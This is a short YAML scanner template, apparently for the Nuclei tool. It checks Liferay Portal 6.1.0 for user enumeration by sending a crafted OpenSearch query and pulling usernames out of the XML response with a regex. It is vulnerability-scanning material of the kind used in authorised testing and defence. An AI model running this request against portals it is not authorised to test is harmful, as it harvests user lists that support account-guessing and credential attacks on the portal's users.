http:
- extractors:
  - group: 1
    name: username
    part: body
    regex:
    - '<title><!\[CDATA\[.*?: (.*?)\]\]><\/title>'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - <liferay:entryClassName>com.liferay.portal.model.User
    - <entry>
  - part: body
    regex:
    - <opensearch:totalResults>\d+</opensearch:totalResults>
    type: regex
  - negative: true
    type: word
    words:
    - <opensearch:totalResults>0</opensearch:totalResults>
    - <opensearch:totalResults><![CDATA[0]]></opensearch:totalResults>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/c/search/open_search?p=1&c=5000&keywords=entryClassName:com.liferay.portal.model.User'
id: liferay-user-enum
info:
  author: collapsz
  description: "Liferay Portal 6.1.0 is vulnerable to user enumeration via the OpenSearch\
    \ endpoint. An\nattacker can exploit this vulnerability to retrieve a list of\
    \ users from the portal by sending\na specially crafted request to the OpenSearch\
    \ endpoint. \n"
  name: Liferay Portal User Enumeration
  severity: medium
  tags: liferay,enum,exposure,cve-2012-10002
